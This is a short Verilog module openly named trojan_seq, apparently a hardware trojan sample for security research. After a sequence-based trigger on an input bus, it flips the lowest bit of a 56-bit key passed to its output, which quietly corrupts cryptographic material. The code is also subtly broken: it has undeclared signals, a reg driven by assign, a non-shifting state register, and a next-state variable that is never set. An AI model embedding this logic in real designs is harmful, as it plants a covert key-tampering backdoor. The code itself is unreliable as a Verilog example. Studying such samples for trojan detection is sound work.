module  trojan_seq(clk, rst, key, trigger, payload);

input				clk;
input				rst;
input	[55:0]	    key;
input	[31:0]	    trigger;
output	[55:0]	    payload;


parameter 	STATE0  = 2'b10, 
			STATE1	= 2'b01, 
			STATE2 	= 2'b11;

reg [5:0]	state_order;
reg [5:0] 	trigger_cond;
assign trigger_cond	= {STATE2, STATE1, STATE0};

always @(negedge clk) begin
	if (rst) begin
		state_order	<= #1 6'h00;
		trojan_en 	<= #1 1'b0;
		payload 	<= #1 key;
	end else begin
		state_order	<= #1 {state_order[5:2], trigger[1:0]};
		trojan_en 	<= #1 trojan_en_next;

		if (trojan_en) begin
			payload	<= #1 {key[55:1], ~key[0]};
		end else begin
			payload <= #1 key;
		end
	end
end

always @(state_order) begin
	trojan_en_next = trojan_en;

	if (state_order == trigger_cond) begin
		trojan_en = 1'b1;
	end
end

endmodule